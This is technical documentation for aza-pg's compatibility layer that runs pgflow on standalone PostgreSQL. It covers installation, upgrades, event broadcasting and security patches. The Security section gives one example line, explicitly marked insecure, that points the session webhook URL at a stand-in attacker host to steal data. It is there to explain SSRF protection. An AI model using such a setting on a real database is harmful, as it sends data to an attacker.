# pgflow - Supabase Compatibility Layer

This document describes how pgflow (Supabase's workflow orchestration extension) is integrated into aza-pg custom PostgreSQL builds.

## Overview

**pgflow** is designed for Supabase Cloud and expects:

- Supabase Realtime API for event broadcasting
- Supabase Vault for credential storage
- Supabase-specific PostgreSQL settings

**aza-pg** provides a compatibility layer that enables pgflow to work in standalone PostgreSQL installations without Supabase infrastructure.

## Architecture

### Components

1. **realtime.send() Stub** (`04a-pgflow-realtime-stub.sh`)
   - Replaces Supabase Realtime API with PostgreSQL native features
   - 3-layer event broadcasting: pg_notify + pgmq (optional) + pg_net webhooks (optional)
   - Installed in `template1` database - all new databases inherit it automatically

2. **Security Patches** (`docker/postgres/pgflow/security-patches.sql`)
   - Fixes search_path hijacking vulnerabilities (AZA-PGFLOW-001, AZA-PGFLOW-002)
   - Applied at runtime after pgflow schema loads

`pgflow.is_local()` is upstream's: it returns true only when `app.settings.jwt_secret` equals the Supabase CLI's
built-in local secret, so on aza-pg it is false. That is the production-safe mode: when a worker deploys a flow whose
definition changed, the worker refuses to start instead of deleting the flow and all its runs.

## Installation

### Initial Database

pgflow is automatically installed during container initialization:

```bash
docker run -e POSTGRES_PASSWORD=secret ghcr.io/fluxo-kt/aza-pg:18
# pgflow schema + patches loaded automatically
```

**Note**: `:18` is a convenience tag pointing to the latest PostgreSQL 18 build. For production, use specific timestamped tags (e.g., `18.4-202606031012-single-node`) for reproducible builds.

### New Databases

The `realtime.send()` stub is inherited from `template1`:

```sql
-- Create new database with pgflow support
CREATE DATABASE my_app TEMPLATE template1;

-- Install pgflow schema
\c my_app
\i /opt/pgflow/schema.sql
\i /opt/pgflow/security-patches.sql
```

Test that it works:

```sql
SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
```

### Upgrading Existing Databases

pgflow is installed only when a database is created, so a database keeps its pgflow version when you move to a newer image. Upgrade it yourself, after stopping your pgflow workers and before deploying `@pgflow/client` / `@pgflow/dsl` of the new version:

```bash
docker exec <container> pgflow-upgrade            # every database with a pgflow schema
docker exec <container> pgflow-upgrade my_app     # or only the ones you name
```

- The current version is read from the schema comment (`pgflow X.Y.Z`), or recognised from the schema's structure for databases created by older images; `--from X.Y.Z` is needed only when the command says it cannot tell.
- Each database is upgraded in one transaction with upstream's migrations plus aza-pg's patches, ending identical to a fresh install; on any error it rolls back and reports it. A second run prints "up to date".
- Databases created by images that shipped pgflow 0.13.x are refused unchanged: those images installed an incomplete schema that no upstream migration path fits.
- pgflow telemetry stays off: the upgrade never schedules upstream's daily usage report. To opt in, run `SELECT pgflow_telemetry.enable();` (and `SELECT pgflow_telemetry.disable();` to stop).

## Usage

### Quick Start (Default Database)

In the default database (created via `POSTGRES_DB` environment variable), pgflow is immediately available:

```sql
-- Verify pgflow is installed
SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>

-- List available pgflow tables
\dt pgflow.*

-- Check pgflow schema version
SELECT * FROM pgflow.flows LIMIT 0;  -- Verifies schema loaded
```

**Event Broadcasting**: pgflow workflows trigger `realtime.send()` events, broadcasting via pg_notify, pgmq (optional), and webhooks (optional).

### Using pgflow in New Databases

For databases created after container initialization:

```sql
-- 1. Create new database (inherits realtime.send() from template1)
CREATE DATABASE my_app;

-- 2. Connect to new database
\c my_app

-- 3. Install required extensions (pgflow prerequisites)
CREATE EXTENSION IF NOT EXISTS pgmq;          -- Optional: Message queue for realtime.send() degradation
CREATE EXTENSION IF NOT EXISTS pg_net;        -- Optional: HTTP webhooks via realtime.send()
CREATE EXTENSION IF NOT EXISTS supabase_vault;  -- Optional: Credential storage (pgflow works without it)

-- 4. Install pgflow schema
\i /opt/pgflow/schema.sql
\i /opt/pgflow/security-patches.sql

-- 5. Verify installation
SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>

-- 6. pgflow is now ready - use the DSL or SQL API
```

### Creating and Running Workflows

pgflow uses a **TypeScript DSL** for workflow definition. Direct SQL manipulation of pgflow tables is not recommended.

**Recommended approach** - Use the official TypeScript packages:

```bash
bun add @pgflow/dsl @pgflow/client
```

**TypeScript Example**:

```typescript
import { Flow } from "@pgflow/dsl";
import { createClient } from "@pgflow/client";

// Define flow with typed input
interface WelcomeInput {
  userId: number;
}

const welcomeFlow = new Flow<WelcomeInput>({ slug: "welcome-user" }).step(
  { slug: "send-email" },
  async (input) => {
    // Call external API to send welcome email
    const response = await fetch("https://api.example.com/send-welcome", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: input.userId }),
    });
    return await response.json();
  }
);

// Initialize pgflow client
const pgflowClient = createClient({
  connectionString: "postgresql://postgres:secret@localhost:5432/postgres",
});

// Start flow and wait for completion
const run = await pgflowClient.startFlow("welcome-user", { userId: 123 });
const result = await pgflowClient.waitForStatus(run.run_id, "completed");
console.log("Flow completed:", result);
```

**SQL API** (advanced usage):

```sql
-- Create flow
SELECT pgflow.create_flow('my-flow', 3, 5, 60);

-- View flows
SELECT * FROM pgflow.flows;

-- View runs
SELECT * FROM pgflow.runs ORDER BY created_at DESC;
```

For complete workflow examples and DSL documentation, see:

- **[pgflow Official Docs](https://pgflow.dev)** - Complete DSL guide
- **[@pgflow/dsl](https://www.npmjs.com/package/@pgflow/dsl)** - TypeScript DSL
- **[@pgflow/client](https://www.npmjs.com/package/@pgflow/client)** - Client library
- **[pgflow GitHub](https://github.com/pgflow-dev/pgflow)** - Source code and examples

## Event Broadcasting

### Layer 1: PostgreSQL LISTEN/NOTIFY (Always Active)

```sql
-- Application listens for events
LISTEN pgflow_events;

-- pgflow triggers workflow, realtime.send() broadcasts
-- Clients receive notification immediately
```

**Use Case**: Real-time updates in single-server deployments

### Layer 2: pgmq Queue (Optional)

Enable reliable queue delivery:

```sql
ALTER SYSTEM SET realtime.pgmq_enabled = 'true';
SELECT pg_reload_conf();
```

pgflow events are now also queued in `pgflow_events` queue for asynchronous processing:

```sql
-- Consumer processes events from queue
SELECT * FROM pgmq.read('pgflow_events', 10, 30);
```

**Use Case**: Decoupled event processing, guaranteed delivery

### Layer 3: HTTP Webhooks (Optional)

Configure webhook endpoint:

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://your-api.example.com/pgflow-events';
SELECT pg_reload_conf();
```

pgflow events are now POSTed to the configured URL:

```json
POST https://your-api.example.com/pgflow-events
Content-Type: application/json

{
  "payload": { ... },
  "event": "flow:started",
  "topic": "workflow_123",
  "timestamp": 1705123456.789,
  "private": false
}
```

**Use Case**: Integration with external systems, microservices architecture

## Security

### SSRF Protection

`realtime.send()` is protected against Server-Side Request Forgery (SSRF) attacks:

```sql
-- PUBLIC execution is revoked by default
REVOKE EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) FROM PUBLIC;

-- Only postgres superuser has access
-- Application roles must be explicitly granted
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

**Rationale**: Prevents unprivileged users from manipulating `realtime.webhook_url` to trigger arbitrary HTTP requests from the database server.

### Webhook URL Management

**✅ SECURE**: System-level configuration (persistent across sessions)

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://trusted-api.internal/events';
SELECT pg_reload_conf();
```

**❌ INSECURE**: Session-level configuration (can be hijacked by attackers)

```sql
SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
```

**Best Practice**: Only administrators should configure webhook URLs via `ALTER SYSTEM`.

### Security Patches Applied

| Identifier         | Component                | Issue                 | Fix                          |
| ------------------ | ------------------------ | --------------------- | ---------------------------- |
| **AZA-PGFLOW-001** | get_run_with_states()    | search_path hijacking | Added `SET search_path = ''` |
| **AZA-PGFLOW-002** | start_flow_with_states() | search_path hijacking | Added `SET search_path = ''` |

## Upstream Tracking

These are **local patches** for compatibility and security. They are tracked internally but not official CVE entries.

## Testing

### Verify Installation

```sql
-- Check realtime.send() exists
SELECT proname, pronargs
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';

-- Check pgflow schema
SELECT COUNT(*) FROM pgflow.flows;

-- Installed pgflow version
SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
```

### Test Event Broadcasting

```sql
-- Start a LISTEN session
LISTEN pgflow_events;

-- Trigger a test event
SELECT realtime.send(
  '{"test": "value"}'::jsonb,
  'test:event',
  'test_topic',
  false
);

-- You should receive a notification:
-- Asynchronous notification "pgflow_events" with payload "{...}" received
```

### Automated Tests

```bash
bun scripts/test/test-pgflow.ts   # pgflow in the built image (aza-pg:pg18 by default)
```

## Troubleshooting

### Issue: pgflow schema fails to load

**Symptoms**:

```text
ERROR:  function realtime.send() does not exist
```

**Solution**: Verify realtime stub was installed:

```sql
SELECT COUNT(*) FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';
-- Should return: 1
```

If missing, the realtime stub was not installed during initialization. This script runs automatically during container startup and requires superuser privileges. To reinstall:

```bash
docker exec <container-name> bash /docker-entrypoint-initdb.d/04a-pgflow-realtime-stub.sh
```

Note: This script modifies template1 and requires PostgreSQL superuser privileges. It's normally executed automatically during container initialization.

Note: This script sets custom PostgreSQL parameters and requires superuser privileges. It's normally executed automatically during container initialization.

### Issue: Permission denied on realtime.send()

**Symptoms**:

```text
ERROR:  permission denied for function send
```

**Solution**: Grant EXECUTE permission to your application role:

```sql
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

### Issue: Webhook not firing

**Checklist**:

1. Is webhook URL configured? `SHOW realtime.webhook_url;`
2. Is pg_net extension loaded? `SELECT * FROM pg_extension WHERE extname = 'pg_net';`
3. Check pg_net logs: `SELECT * FROM net._http_response ORDER BY id DESC LIMIT 10;`
4. Verify network connectivity from database server to webhook endpoint

## Version Compatibility

The pgflow version an image ships is listed in `CHANGELOG.md` per release and in `/etc/postgresql/version-info.txt` inside the image; it comes from the `pgflow` tag in `scripts/extensions/manifest-data.ts`. Use `@pgflow/client` and `@pgflow/dsl` of the same version.

## Performance Considerations

### pg_notify

- **Latency**: <1ms (immediate)
- **Throughput**: 1000s/sec
- **Persistence**: None (in-memory only)
- **Best For**: Real-time UI updates, single-server deployments

### pgmq

- **Latency**: ~10ms (queue write)
- **Throughput**: 100s-1000s/sec
- **Persistence**: Durable (table-backed)
- **Best For**: Reliable event processing, work queues

### pg_net Webhooks

- **Latency**: ~50-500ms (HTTP round-trip)
- **Throughput**: 10s-100s/sec
- **Persistence**: Best-effort (no retry on failure)
- **Best For**: External system integration, audit trails

## References

- [pgflow Documentation](https://github.com/pgflow-dev/pgflow)
- [Supabase Realtime](https://supabase.com/docs/guides/realtime)
- [PostgreSQL LISTEN/NOTIFY](https://www.postgresql.org/docs/current/sql-notify.html)
- [pgmq Extension](https://github.com/tembo-io/pgmq)
- [pg_net Extension](https://github.com/supabase/pg_net)

## Contributing

Found a bug or have a suggestion? Please file an issue at: [aza-pg/issues](https://github.com/fluxo-kt/aza-pg/issues)

When reporting pgflow issues, include:

- aza-pg image version
- pgflow version (check `/opt/pgflow/schema.sql` header or `/opt/pgflow/security-patches.sql`)
- Error message and stack trace
- Steps to reproduce
